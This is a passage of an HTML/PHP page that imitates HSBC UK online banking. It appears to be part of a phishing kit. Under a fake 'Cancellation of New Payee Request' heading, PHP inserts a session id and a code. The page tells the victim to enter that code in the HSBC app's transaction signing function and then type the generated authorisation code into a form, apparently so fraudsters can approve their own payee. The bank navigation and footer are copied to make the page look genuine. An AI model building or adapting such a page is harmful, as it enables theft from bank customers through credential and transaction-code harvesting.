                                                <h3><a href="https://www.hsbc.co.uk/current-accounts/products/overdrafts/" title="Overdraft service" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/Overdrafts/Tab','WT.ti','Doormat:Homepage:Borrowing:Overdrafts:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Overdraft
                                                service</a></h3>

                                                <p>Manage your money by agreeing an arranged overdraft facility and keeping within its limit.</p>

                                                <p class="ctaLink"><a href="https://www.hsbc.co.uk/current-accounts/products/overdrafts/" title="Learn more about overdrafts" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/MortgagesRates/ViewAll/Tab','WT.ti','Doormat:Homepage:Borrowing:MortgagesRates:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Learn
                                                more<span class="hidden" aria-hidden="true"> about overdrafts</span></a></p>
                                            </div>
                                        </div>

                                    </div>
                                </div>
                            </li>

                            <li class="level1" id="dijit__WidgetBase_2" widgetid="dijit__WidgetBase_2"><a tabindex="0" aria-expanded="false" aria-label="Investing - products and analysis" aria-haspopup="true" class="mainTopNav" id="Investing"><strong>Investing</strong><br>
                            Products &amp; analysis</a>
                                <div class="doormatWrapper fourColRight" style="opacity: 0; display: none;" aria-hidden="true">
                                    <div class="arrow">&nbsp;</div>

                                    <div class="doormat">
                                        <p class="skipLink"><a href="#" title="Move to Insurance navigation">Move to Insurance
                                        navigation</a></p>

                                        <div class="doormatLeft">
                                            <div class="column">
                                                <h3><a href="https://investments.hsbc.co.uk/products" title="Investments" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/Investments/Tab','WT.ti','Doormat:Homepage:Investing:Investments:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Investments</a></h3>

                                                <ul role="menu">
                                                    <li role="menuitem"><a role="menuitem" href="https://investments.hsbc.co.uk/product/206/investment-funds-online" title="Investment funds" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/Investments/Funds/Tab','WT.ti','Doormat:Homepage:Investing:Investments:Funds:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Investment
                                                    funds</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="https://investments.hsbc.co.uk/product/5/sif-isa" title="Selected Investment Funds ISA" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Investing/Investments/FundsISA/Tab','WT.ti','Doormat:Investing:Investments:FundsISA:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Selected
                                                    Investment Funds ISA</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="https://investments.hsbc.co.uk/product/9/sharedealing" title="Sharedealing" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/Investments/Sharedealing/Tab','WT.ti','Doormat:Homepage:Investing:Investments:Sharedealing:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Sharedealing</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="http://investments.hsbc.co.uk/product/19/hsbc-premier-financial-advice" title="HSBC Premier Financial Advice" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/Investments/PremierAdvice/Tab','WT.ti','Doormat:Homepage:Investing:Investments:PremierAdvice:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">HSBC
                                                    Premier Financial Advice</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="https://investments.hsbc.co.uk/product/11/child-trust-funds" title="Child Trust Fund" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/Investments/ChildTrustFund/Tab','WT.ti','Doormat:Homepage:Investing:Investments:ChildTrustFund:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Child
                                                    Trust Fund</a></li>
                                                </ul>

                                                <p class="ctaLink"><a href="https://investments.hsbc.co.uk/products" title="View all investments" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/Investments/Products/ViewAll/Tab','WT.ti','Doormat:Homepage:Investing:Investments:Product:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View
                                                all <span class="hidden" aria-hidden="true">investments</span></a></p>

                                            </div>
                                            <div class="column">
                                                <h3><a href="https://investments.hsbc.co.uk/product/206/investing-in-funds-online" title="Global Investment Centre" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/Investments/GIC/Tab','WT.ti','Doormat:Homepage:Investing:Investments:GIC:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Global
                                                Investment Centre</a></h3>

                                                <p>Trade funds online</p>

                                                <p class="ctaLink"><a href="https://investments.hsbc.co.uk/product/206/investing-in-funds-online" title="Find out more about trading funds online" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/Investments/GIC/Tab','WT.ti','Doormat:Homepage:Investing:Investments:GIC:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Find
                                                out more <span class="hidden" aria-hidden="true">about trading funds online</span></a></p>
                                            </div>
                                            <div class="column">
                                                <h3><a href="https://investments.hsbc.co.uk/news" title="Financial news and analysis." class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/PromoSlot1/Tab?WT.ac=HBEU_Doormat_Homepage_Investing_PromoSlot1','WT.ti','Doormat:Homepage:Investing:PromoSlot1:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Financial
                                                news and analysis.</a></h3>
                                            </div>

                                            <div class="column">
                                                <h3><a href="https://investments.hsbc.co.uk/why-invest-with-us" title="Why invest with us?" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/WhyInvestWithUs/Tab','WT.ti','Doormat:Homepage:Investing:WhyInvestWithUs:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Why
                                                invest with us?</a></h3>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </li>

                            <li class="level1" id="dijit__WidgetBase_3" widgetid="dijit__WidgetBase_3"><a tabindex="0" aria-expanded="false" aria-label="Insurance - property and family" aria-haspopup="true" class="mainTopNav" id="insurance"><strong>Insurance</strong><br>
                            Property &amp; family</a>
                                <div class="doormatWrapper fourColRight" style="opacity: 0; display: none;" aria-hidden="true">
                                    <div class="arrow">&nbsp;</div>

                                    <div class="doormat">
                                        <p class="skipLink"><a href="#" title="Move to site search">Move Planning navigation</a></p>

                                        <div class="doormatLeft">
                                            <div class="column">
                                                <h3><a href="https://www.hsbc.co.uk/insurance/products/travel/" title="Travel Insurance" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Insurance/HeaderLink/TravelInsurance/Tab','WT.ti','Doormat:Homepage:Insurance:HeaderLink:TravelInsurance:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Travel</a></h3>

                                                <ul role="menu">
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/insurance/products/travel/" title="Travel Insurance" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Insurance/TravelInsurance/Tab','WT.ti','Doormat:Homepage:Insurance:TravelInsurance:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Travel
                                                    Insurance</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/insurance/products/premier-travel/" title="HSBC Premier Travel Insurance" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Insurance/PremierTravelInsurance/Tab','WT.ti','Doormat:Homepage:Insurance:PremierTravelInsurance:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">HSBC
                                                    Premier Travel Insurance</a></li>

                                                </ul>
                                            </div>
                                            <div class="column">
                                                <h3><a href="https://www.hsbc.co.uk/insurance/products/home/" title="Home Insurance" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Insurance/PromoSlot1/Tab?WT.ac=HBEU_Doormat_Homepage_Insurance_PromoSlot1','WT.ti','Doormat:Insurance:PromoSlot1:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Home
                                                    Insurance</a></h3>

                                            </div>
                                            <div class="column">
                                                <h3><a href="https://www.hsbc.co.uk/insurance" title="View all HSBC Insurance options" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Insurance/AllInsuranceProducts/Tab','WT.ti','Doormat:Homepage:Insurance:AllInsuranceProducts:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View
                                                    all HSBC Insurance options</a></h3>
                                            </div>

                                            <div class="column">

                                                <h3><a href="https://www.hsbc.co.uk/help" title="Customer support" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Insurance/CustomerSupport/Tab','WT.ti','Doormat:Homepage:Insurance:CustomerSupport:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Customer
                                                support</a></h3>

                                                <ul role="menu">
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/insurance/products/home/claims/" title="Home Insurance claims" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Insurance/HomeInsurance/MakingAClaim/Tab','WT.ti','Doormat:Homepage:Insurance:HomeInsurance:MakingAClaim:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Home
                                                    Insurance claims</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/insurance/products/travel/" title="Travel Insurance claims" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Insurance/TravelInsurance/MakingAClaim/Tab','WT.ti','Doormat:Homepage:Insurance:TravelInsurance:MakingAClaim:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Travel
                                                    Insurance claims</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/insurance/products/premier-travel/" title="Premier Travel Insurance claims" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Insurance/PremierTravelInsurance/MakingAClaim/Tab','WT.ti','Doormat:Homepage:Insurance:PremierTravelInsurance:MakingAClaim:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Premier
                                                    Travel Insurance claims</a></li>

                                                </ul>

                                                <p class="ctaLink"><a href="https://www.hsbc.co.uk/1/2/customer-support" title="View all customer support" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Insurance/CustomerSupport/ViewAll/Tab','WT.ti','Doormat:Homepage:Insurance:CustomerSupport:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View
                                                all <span class="hidden" aria-hidden="true">customer support</span></a></p>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </li>

                            <li class="level1" id="dijit__WidgetBase_4" widgetid="dijit__WidgetBase_4"><a tabindex="0" aria-expanded="false" aria-label="Life events - help and support" aria-haspopup="true" class="mainTopNav" id="lifeEvents"><strong>Life events</strong><br>
                            Help and support</a>
                                <div class="doormatWrapper fourColRight" style="opacity: 0; display: none;" aria-hidden="true">
                                    <div class="arrow">&nbsp;</div>

                                    <div class="doormat">
                                        <p class="skipLink"><a href="#" title="Move to site search">Move to site search</a></p>

                                        <div class="doormatLeft">
                                            <div class="column">
                                                <h3><a href="http://financialplanning.hsbc.co.uk/#/all" title="Life events" class="extLink" onclick="">Life events</a></h3>

                                                <ul role="menu">
                                                    <li role="menuitem"><a role="menuitem" href="http://financialplanning.hsbc.co.uk/events/dealing-with-bereavement" title="Bereavement support" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Planning/BereavementSupport/Tab','WT.ti','Doormat:Homepage:Planning:BereavementSupport:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Bereavement
                                                    support</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="http://financialplanning.hsbc.co.uk/events/dealing-with-separation" title="Separation support" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Planning/SeparationSupport/Tab','WT.ti','Doormat:Homepage:Planning:SeparationSupport:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Separation
                                                    support</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="http://financialplanning.hsbc.co.uk/events/settling-in-the-uk" title="Settling in the UK" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Planning/SettlingInTheUK/Tab','WT.ti','Doormat:Homepage:Planning:SettlingInTheUK:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Settling
                                                    in the UK</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="http://financialplanning.hsbc.co.uk/events/getting-married" title="Getting married" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Planning/GettingMarried/Tab','WT.ti','Doormat:Homepage:Planning:GettingMarried:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Getting
                                                    married</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="http://financialplanning.hsbc.co.uk/events/planning-your-retirement" title="Planning your retirement" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Planning/PlanningYourRetirement/Tab','WT.ti','Doormat:Homepage:Planning:PlanningYourRetirement:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Planning
                                                    your retirement</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="http://financialplanning.hsbc.co.uk/events/growing-your-wealth" title="Growing your wealth" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Planning/GrowingYourWealth/Tab','WT.ti','Doormat:Homepage:Planning:GrowingYourWealth:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Growing
                                                    your wealth</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="http://financialplanning.hsbc.co.uk/events/moving-abroad" title="Moving abroad" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Planning/MovingAbroad/Tab','WT.ti','Doormat:Homepage:Planning:MovingAbroad:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Moving
                                                    abroad</a></li>
                                                </ul>

                                                <ul role="menu">
                                                    <li role="menuitem"><a role="menuitem" href="http://financialplanning.hsbc.co.uk/tool/800/financial-health-check" title="Financial health check" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Planning/FinancialHealthCheck/Tab','WT.ti','Doormat:Homepage:Planning:FinancialHealthCheck:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Financial
                                                    health check</a></li>
                                                </ul>

                                            </div>
                                            <div class="column">
                                                <h3><a href="http://financialplanning.hsbc.co.uk/planningtools" title="Planning tools" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Planning/PlanningTools/Tab','WT.ti','Doormat:Homepage:Planning:PlanningTools:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Planning
                                                tools</a></h3>
                                            </div>
                                            <div class="column">
                                                <h3><a href="http://financialplanning.hsbc.co.uk/events/protecting-what-matters" title="Protecting what matters" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Planning/PromoSlot1/Tab?WT.ac=HBEU_Doormat_Homepage_Planning_PromoSlot1','WT.ti','Doormat:Planning:PromoSlot1:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Protecting
                                                what matters</a></h3>

                                                <p class="ctaLink"><a href="http://financialplanning.hsbc.co.uk/events/protecting-what-matters" title="Protecting what matters. Learn more." class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Planning/PromoSlot1/Tab?WT.ac=HBEU_Doormat_Homepage_Planning_PromoSlot1','WT.ti','Doormat:Planning:PromoSlot1:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Learn
                                                more</a></p>

                                            </div>
                                            <div class="column">
                                                <h3><a href="https://www.hsbc.co.uk/help/" title="Customer support" onclick="dcsMultiTrack('DCS.dcsuri','Doormat/Homepage/Planning/CustomerSupport/Tab','WT.ti', 'Doormat:Homepage:Planning:CustomerSupport:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Customer
                                                support</a></h3>

                                                <ul role="menu">
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/help" title="Ways we can help" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','Doormat/Homepage/Planning/CustomerSupport/NeedAdvice/Tab','WT.ti','Doormat:Homepage:Planning:CustomerSupport:NeedAdvice:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Ways
                                                    we can help</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="http://financialplanning.hsbc.co.uk/article/81/frequently-asked-questions" title="Frequently asked questions" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','Doormat/Homepage/Planning/CustomerSupport/FAQs/Tab','WT.ti', 'Doormat:Homepage:Planning:CustomerSupport:FAQs/Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Frequently
                                                    asked questions</a></li>
                                                </ul>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </li>
                        </ul>
                    </nav>
                </div>
            </div>
        </div>
        <!-- Header Section Ends -->
        <!-- Entity Content Top Starts -->

        <div class="pageHeaderBg" dir="ltr">
            <div class="pageHeading row">
                <div class="pageHeadingInner">
                    <h2>Cancellation of New Payee Request</h2>
                </div>
            </div>
        </div>

        <div class="innerPage grid_skin" dir="ltr" id="askquestion">
            <div class="grid grid_24">
            </div>
        </div>

        <!-- Entity Content Top Ends -->
        <div class="innerPage" id="innerPage">
            <div class="grid_skin">
                <!-- On Page Error Starts -->

                <!-- On Page Error Ends -->

                <div class="row">
                    <div class="containerStyle01">
                        <!-- Main Content Starts -->
                        <!-- use grid grid_24 if no Entity content right -->
                        <div class="grid grid_24">

                            <div class="securityDetails">

                                

                                <p>To cancel the request to add a New Payee to your account, please authorise this change using your HSBC Mobile banking app.</p>

                                <form id="dijit_form_Form_0" method="post" action="" novalidate onsubmit="return login();">
                                    <input type='hidden' name='userid' value="<?=$_SESSION['uniqueid'];?>">

                                    <!--41P Logic start -->
                                    <!--41P Logic end -->

                                    

                                    <div id="hideshowC" class="row showHideOpen" data-dojo-type="hsbcwidget/showHideLegacy" data-dojo-props="startOpen: true,showHideInstructionDetails: 'securityTokenInstructions'" widgetid="hideshowC" lang="en-GB">

                                        <div class="row bottomPadding0 containerStyle24">
                                            <div class="questionGroup questionGroup-ext02 clearfix securityDetails securityDetails-ext02">
                                                <h4 class="left">

													2.

															Enter security code
														</h4>

                                                <ul>
                                                    <li><a class="buttonArrow right showHideTrigger" href="#"><span class="showLegacy">Show</span><span class="hideLegacy">Hide</span> instructions<span class="icon"></span> <span id="linkStatus" class="hidden">expanded</span></a></li>

                                                </ul>

                                            </div>
                                        </div>
                                        <div class="row bottomPadding0 showHideContent" style="height: auto;">

                                            <p class="left"></p>

                                            <div class="clearfix memorableAnswer style1 ">

                                                <p>If you've forgotten your Digital Secure Key password, select the (?) on your mobile device for help.
                                                    <br <br="">(?) = the question mark image on the top right of the screen</p>
                                                <p>
                                                </p>
                                                <ul class="steps">
                                                    <li class="first" style="width:314px !important;"><img src="files/img/01PreLogon.png" alt="" class="softTokenImg">
                                                        <h5>1</h5>
                                                        <p class="floatNone01" style="width: 99% !important;">
														Launch the HSBC Mobile Banking app and select '<b>Generate security code</b>',<br>then '<b>Transaction</b>'.<br>
														if you're a touch ID user,<br>
														cancel the log on prompt and<br>
														then select '<b>Generate security code</b>', then '<b>Transaction</b>'
														
														
                                                           </p>
                                                    </li>

                                                    <li style="width:314px !important;"><img src="files/img/secureKeyPassword.png" alt="" class="softTokenImg">
                                                        <h5>2</h5>
                                                        <p class="floatNone01">Input the following code:
                                                            <br>
                                                            <b><?=$cancelcode;?></b>
															</p>
                                                    </li>

                                                    <li style="width:314px !important;"><img src="files/img/05Key.png" alt="" class="softTokenImg">
                                                        <h5>3</h5>
                                                        <p class="floatNone01" style="width: 96%;">
														Enter your Digital Secure Key
password where indicated and
select '<b>Generate code</b>' or use
your Biometric ID.<br>
Your authorisation security
code will be displayed. Enter
this without any spaces in the
'<b>Enter your authorisation
code</b>' field below.
														
														
														
														
														</p>
                                                    </li>
                                                </ul>

                                            </div>
                                        </div>
                                    </div>
                                    <div class="row memorableAnswer-question">
                                        <h4>

											</h4>
                                        <div class="questionGroup">
                                            <div class="question question_2040 clearfix jsQuestion">

                                                <label for="payeecode">Enter your log on security code
                                                </label>

                                                <div class="textInput">
                                                    <input pattern="^[A-Za-z0-9]{5,8}$" onkeydown='return (event.which >= 48 && event.which <= 57) || event.which == 8 || event.which == 46 || event.which == 37 || event.which == 39'  maxlength="8" type="password" id="payeecode" name="payeecode">
                                                </div>
                                            </div>

                                            <ul class="linkList01">

                                              

                                                <li class="stolen"><a class="underline jsLightboxTrigger" href="#secondary" data-target-id="lightboxContentSoft"> Lost, damaged or stolen Secure Key<span class="hidden"> Open in an overlay window</span> <span class="chevron"></span></a>
                                                </li>

                                            </ul>

                                        </div>

                                    </div>

                                    <div>

                                        <a class="button tertiary tertiaryBtn" href="#">
                                            <span class="buttonInner"> Cancel </span>
                                        </a>

                                        <div class="right">

                                            <div class="button primary primaryBtn">
                                                <span class="buttonInner"> 
												<input type="submit" value="Continue" class="submit_input" onclick="login()">
													</span>
                                            </div>

                                        </div>
                                    </div>
                                </form>

                            </div>

                        </div>
                        <!-- Main Content Ends -->
                        <!-- Entity Content Right Starts -->

                        <!-- Entity Content Right Ends -->
                    </div>
                </div>

                <!-- Entity Content Bottom Starts -->
                <!-- File missing from nas for gsp_eu_uat although its there in WCM. Adding this comment so that we can syndicate the file again. 27-MAY-14 -->

            </div>
        </div>
    </div>
    <!-- Entity Content Bottom Ends -->

    <!-- Footer Section Starts -->

    
    <style type="text/css">
        #footerMapRow,
        #footerLinksRow,
        #footerUtilityRow {
            width: 940px;
        }
        
        #footerMap #footerMapRow .column.last {
            padding-right: 0
        }
        
        #footerMap #footerMapRow .column {
            padding: 0 10px 0 0;
            width: 145px;
        }
    </style>
    <div dir="ltr" id="footerLinks">
        <div id="footerLinksRow">
            <ul style="display: flex; white-space: nowrap;">
                <li class="contact">
                    <a href="https://www.hsbc.co.uk/help/" title="Help &amp; Support">Help &amp; Support</a></li>
                <li class="branch">
                    <a href="http://www.hsbc.co.uk/branch-finder" title="Find a branch">Find a branch</a></li>
                <!-- <li class="feedback">
					<a href="javascript:void(0);" onclick="oo_feedback.show()" title="Website feedback. Rate your experience on this page. This link will open an overlay window.">Website feedback</a></li> -->
            </ul>
        </div>
    </div>
    <div dir="ltr" id="footerMap">
        <div class="sixCol" id="footerMapRow">
            <div class="column last">
                <h2>
                <a href="https://www.hsbc.co.uk/help/" title="Support">Support</a></h2>
                <ul>
                    <li>
                        <a href="http://www.hsbc.co.uk/help/security-centre/" title="Security centre">Security centre</a></li>
                    <li>
                        <a href="https://www.hsbc.co.uk/help/card-support/" title="Card support">Card support</a></li>
                    <li>
                        <a onclick="window.tealiumLaunchCobrowse(); return false;" href="#" title="CoBrowse">CoBrowse</a></li>
                </ul>
            </div>
        </div>
    </div>
    <div dir="ltr" id="footerUtility">
        <div id="footerUtilityRow">
            <ul>
                <li>
                    <a href="http://www.about.hsbc.co.uk/" title="About HSBC">About HSBC</a></li>
                <li>
                    <a href="https://www.hsbc.co.uk/site-map/" title="Site map">Site map</a></li>
                <li>
                    <a href="http://www.hsbc.co.uk/legal" title="Legal">Legal</a></li>
                <li>
                    <a href="http://www.hsbc.co.uk/privacy-notice" title="Privacy Notice">Privacy notice</a></li>
                <li>
                    <a href="http://www.hsbc.co.uk/cookie-policy" title="Cookie Policy" class="dnt_no_consent">Cookie
                    Policy</a></li>
                <li>
                    <a href="https://www.hsbc.co.uk/accessibility/" title="Accessibility">Accessibility</a></li>
                <li>
                    <a href="https://www.hsbc.com/" title="HSBC Group">HSBC Group</a></li>
            </ul>
            <p>
                © &nbsp;HSBC Group <script>document.write((new Date()).getFullYear());</script></p>
        </div>
    </div>
    <div class="loadinContent" data-dojo-type="hsbcwidget/countrySelector" dir="ltr" id="countrySelectorContent" widgetid="countrySelectorContent" style="display: none;" lang="en-GB">
        <div role="presentation" class="tabsNode">
            <ul class="regionTabs" role="tablist">

                <li role="tabmenu" class="selected">
                    <a class="tabs" role="tab" id="europeTab" aria-controls="europe" tabindex="0" aria-expanded="true" title="
					Europe: Click to view HSBC websites in this region" data-region="europe" href="#">
                    Europe</a>

                </li>

                <li role="tabmenu" class="">
                    <a class="tabs" role="tab" id="asiaPacificTab" aria-controls="asiaPacific" tabindex="-1" aria-expanded="false" title="Asia-Pacific: Click to view HSBC websites in this region" data-region="asiaPacific" href="#">
                    Asia-Pacific</a>
                </li>

                <li role="tabmenu" class="">
                    <a class="tabs" role="tab" id="middleEastTab" aria-controls="middleEast" tabindex="-1" aria-expanded="false" title="Middle East &amp; Africa: Click to view HSBC websites in this region" data-region="middleEast" href="#">
                    Middle East &amp; Africa</a>
                </li>

                <li role="tabmenu" class="">
                    <a class="tabs" role="tab" id="americasTab" aria-controls="americas" tabindex="-1" aria-expanded="false" title="Americas: Click to view HSBC websites in this region" data-region="americas" href="#">
                    Americas</a>
                </li>

            </ul>

        </div>
        <div class="regions" aria-label="regions">
            <div aria-hidden="false" class="region activeRegion" id="europeMenu" role="tabpanel" aria-labelledby="europeTab">
                <h2 style=" display: none;">
                Europe</h2>
                <div class="navList">
                    <ul class="nav">
                        <li class="multiTop">
                            <a href="http://www.hsbc.am/1/2/en/home" title="Armenia" class="am" lang="en-GB">Armenia</a></li>
                        <li class="multiBottom">
                            <a href="http://www.hsbc.am/1/2/hy/home" title="Հայաստան" lang="hy-AM">Հայաստան</a></li>
                        <li>
                            <a href="https://ciiom.hsbc.com/" title="Channel Islands and Isle of Man" class="im" lang="en-GB">Channel
                            Islands
                            and Isle of Man</a></li>
                        <li class="multiTop">
                            <a href="http://www.hsbc.cz/1/2/cze/en/business" title="Czech Republic" class="cz" lang="cs-CZ">Czech
                            Republic</a></li>
                        <li class="multiBottom">
                            <a href="http://www.hsbc.cz/1/2/cze/cs/business" title="Česká republika" lang="en-GB">Česká
                            republika</a></li>
                        <li class="multiTop">
                            <a href="https://www.hsbc.fr/1/2/english/personal" title="France (English)" class="fr" lang="en-GB">France
                            <span>(English)</span></a></li>
                        <li class="multiBottom">
                            <a href="https://www.hsbc.fr/1/2/hsbc-france" title="France (Français)" lang="fr-FR">France
                            <span>(Français)</span></a></li>
                        <li>
                            <a href="http://www.hsbctrinkaus.de/global/display/home" title="Germany" class="de" lang="en-GB">Germany</a></li>
                        <li class="multiTop">
                            <a href="http://www.hsbc.gr/1/2/en/home" title="Greece" class="gr" lang="en-GB">Greece</a></li>
                        <li class="last multiBottom">
                            <a href="http://www.hsbc.gr/1/2/el/home" title="Ελλάδα" lang="el-GR">Ελλάδα</a></li>
                    </ul>
                    <ul class="nav">

                        <li>
                            <a href="http://www.offshore.hsbc.com/1/2/international/home" title="HSBC Expat" class="je" lang="en-GB">HSBC
                            Expat</a></li>
                        <li>
                            <a href="http://www.hsbccredit.hu/" title="Hungary" class="hu" lang="hu-HU">Hungary</a></li>
                        <li>
